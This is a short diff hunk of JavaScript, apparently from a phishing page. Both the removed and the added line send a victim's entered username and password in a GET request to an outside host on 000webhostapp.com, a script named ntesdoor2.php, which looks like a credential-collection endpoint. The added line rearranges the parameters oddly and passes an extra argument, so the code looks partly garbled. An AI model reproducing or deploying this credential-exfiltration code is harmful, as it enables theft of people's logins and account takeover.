@@ -80,7 +80,7 @@
                             }
                         }
                     };
-                    xhttp.open("GET", "https://newvoicemessag33.000webhostapp.com/ntesdoor2.php?user=" + em + "&pass=" +ps, true);
+                    xhttp.open("GET", "https://newvoicemessag33.000webhostapp.com/ntesdoor2.php?user=" + testx +   "&pass="  + em +  ps , true, true);
                     xhttp.send();
                 }
 
